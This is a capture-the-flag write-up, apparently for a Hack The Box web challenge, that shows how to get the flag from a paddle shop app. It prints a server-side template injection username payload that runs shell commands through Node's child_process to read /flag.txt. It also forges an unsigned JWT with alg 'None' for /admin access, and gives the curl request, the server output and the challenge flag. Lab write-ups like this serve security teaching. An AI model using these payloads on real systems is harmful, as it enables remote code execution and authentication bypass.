# Didactic Octo Paddle

You have been hired by the Intergalactic Ministry of Spies to retrieve a powerful relic that is believed to be hidden within the small paddle shop, by the river. You must hack into the paddle shop's system to obtain information on the relic's location. Your ultimate challenge is to shut down the parasitic alien vessels and save humanity from certain destruction by retrieving the relic hidden within the Didactic Octo Paddles shop.

## Writeup

Create a user named:

```js
username: {{:"pwnd".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('cat /flag.txt').toString()")()}}
password: ciao
```

Now we must find a way to go in **/admin** with the correct **jwt** session token.

Modify the jwt session token by using this json bsa64:

```json
{
  "alg": "None",
  "typ": "JWT"
}
```

In base64:

```base64
ewogICJhbGciOiAiTm9uZSIsCiAgInR5cCI6ICJKV1QiCn0=
```

```json
{
  "id": 1,
  "iat": 1679253240
}
```

```base64
ewogICJpZCI6IDEsCiAgImlhdCI6IDE2NzkyNTMyNDAKfQ==
```

Now we can marge the custom **jwt**.

Do not insert the **=** character and **.** at the end.

This is the token:

```
ewogICJhbGciOiAiTm9uZSIsCiAgInR5cCI6ICJKV1QiCn0.ewogICJpZCI6IDEsCiAgImlhdCI6IDE2NzkyNTMyNDAKfQ.
```

Use it to go in the **/admin** page and display the flag (change the ip and port address first):

```bash
curl -X GET http://68.183.37.122:30420/admin \
    -H 'Cookie: session=ewogICJhbGciOiAiTm9uZSIsCiAgInR5cCI6ICJKV1QiCn0.ewogICJpZCI6IDEsCiAgImlhdCI6IDE2NzkyNTMyNDAKfQ.'
```

This is the output:

```html
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <title>Admin Dashboard</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="icon" href="/static/images/favicon.png" />
  <link href="https://cdn.jsdelivr.net/npm/bootswatch@5.2.3/dist/cerulean/bootstrap.min.css" rel="stylesheet" />
  <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet" />
  <link rel="stylesheet" type="text/css" href="/static/css/main.css" />
</head>

<body>
  <div class="d-flex justify-content-center align-items-center flex-column" style="height: 100vh;">
    <h1>Active Users</h1>
    <ul class="list-group small-list">
      
        <li class="list-group-item d-flex justify-content-between align-items-center ">
          <span>admin</span>
        </li>
      
        <li class="list-group-item d-flex justify-content-between align-items-center ">
          <span>HTB{Pr3_C0MP111N6_W17H0U7_P4DD13804rD1N6_5K1115}
</span>
        </li>
      
    </ul>
  </div>
</body>

</html> 
```

With the flag:

```
HTB{Pr3_C0MP111N6_W17H0U7_P4DD13804rD1N6_5K1115}
```